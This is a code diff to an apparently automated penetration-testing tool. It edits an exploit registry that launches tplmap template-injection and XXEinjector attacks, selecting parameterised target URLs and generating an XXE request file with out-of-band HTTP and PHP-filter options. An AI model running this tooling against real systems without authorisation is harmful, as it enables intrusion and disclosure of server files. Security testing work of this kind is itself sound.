@@ -2,6 +2,7 @@ package abhimanyu
 
 import (
 	"fmt"
+	"os"
 	"strings"
 )
 
@@ -150,7 +151,14 @@ var exploitRegistry = []ToolSpec{
 		InstallHint: "git clone https://github.com/epinna/tplmap /opt/tplmap && pip3 install -r /opt/tplmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/tplmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/tplmap/tplmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/tplmap",
 		InstallCmd:  "git clone https://github.com/epinna/tplmap /opt/tplmap && pip3 install -r /opt/tplmap/requirements.txt --break-system-packages && sudo tee /usr/local/bin/tplmap > /dev/null <<'EOF'\n#!/bin/bash\npython3 /opt/tplmap/tplmap.py \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/tplmap",
 		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
+			// Use first live URL with parameters if available
 			u := target
+			for _, lu := range ctx.LiveURLs {
+				if strings.Contains(lu, "=") {
+					u = lu
+					break
+				}
+			}
 			if !strings.HasPrefix(u, "http") {
 				u = "https://" + u
 			}
@@ -165,6 +173,9 @@ var exploitRegistry = []ToolSpec{
 		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
 			func(target string, ctx *AbhimanyuContext) []string {
 				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
 				if !strings.HasPrefix(u, "http") {
 					u = "https://" + u
 				}
@@ -210,13 +221,25 @@ var exploitRegistry = []ToolSpec{
 		InstallCmd:  "git clone https://github.com/enjoiz/XXEinjector /opt/xxeinjector && sudo tee /usr/local/bin/xxeinjector > /dev/null <<'EOF'\n#!/bin/bash\nruby /opt/xxeinjector/XXEinjector.rb \"$@\"\nEOF\nsudo chmod +x /usr/local/bin/xxeinjector",
 		BuildArgs: func(target string, ctx *AbhimanyuContext) []string {
 			u := target
+			if len(ctx.LiveURLs) > 0 {
+				u = ctx.LiveURLs[0]
+			}
 			if !strings.HasPrefix(u, "http") {
 				u = "https://" + u
 			}
+			// Auto-generate a minimal XML request file for XXEinjector
+			reqFile := "/tmp/cybermind_xxe_request.xml"
+			xmlContent := fmt.Sprintf(`POST / HTTP/1.1
+Host: %s
+Content-Type: application/xml
+Content-Length: 30
+
+<?xml version="1.0"?>XXEINJECT`, strings.TrimPrefix(strings.TrimPrefix(u, "https://"), "http://"))
+			os.WriteFile(reqFile, []byte(xmlContent), 0600)
 			return []string{
 				"--host", u,
 				"--path", "/",
-				"--file", "/tmp/cybermind_xxe_request.xml",
+				"--file", reqFile,
 				"--oob", "http",
 				"--phpfilter",
 				"--verbose",
@@ -225,6 +248,9 @@ var exploitRegistry = []ToolSpec{
 		FallbackArgs: []func(target string, ctx *AbhimanyuContext) []string{
 			func(target string, ctx *AbhimanyuContext) []string {
 				u := target
+				if len(ctx.LiveURLs) > 0 {
+					u = ctx.LiveURLs[0]
+				}
 				if !strings.HasPrefix(u, "http") {
 					u = "https://" + u
 				}
